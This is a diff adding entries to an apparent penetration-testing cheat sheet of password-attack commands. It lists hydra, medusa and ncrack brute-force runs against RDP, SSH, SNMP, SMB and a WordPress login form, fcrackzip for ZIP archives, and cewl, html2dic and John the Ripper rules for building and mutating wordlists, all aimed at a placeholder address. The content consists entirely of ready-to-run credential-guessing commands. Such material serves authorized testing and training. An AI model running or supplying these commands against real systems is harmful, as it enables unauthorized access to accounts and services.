@@ -6,6 +6,31 @@ ncrack -vv --user root -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 -oN
 
 # Bruteforce MSSQL using wordlist
 medusa -h 10.10.10.10 -U users.txt -P /usr/share/wordlists/rockyou.txt -M mssql -n 1433 -O medusa.txt
+hydra -t 1 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
 
 # Bruteforce SSH using wordlist
 medusa -H hosts_ssh.txt -U users.txt -P passwords.txt -M ssh -t 1 -T 5 -O medusa_ssh.txt
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
+
+# Bruteforce SNMP using wordlist
+hydra -P /usr/share/wordlists/rockyou.txt -v 10.10.10.10 snmp
+
+# Bruteforce SMB using wordlist
+hydra -t 1 -V -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb
+
+# Bruteforce ZIP files using wordlist
+fcrackzip -v -b -D -p /usr/share/wordlists/rockyou.txt -u file.zip
+
+# Bruteforce Wordpress login using wordlist
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+# Password dictionary generation
+cewl www.domain.com -m 6 -w domain_dic.txt
+html2dic index.html | sort -u > index_dic.txt
+
+# Password mutation
+vi /etc/john/john.conf
+# Add two numbers
+$[0-9]$[0-9]
+
+john --wordlist=domain_dic.txt --rules --stdout > domain_dic_mutated.txt
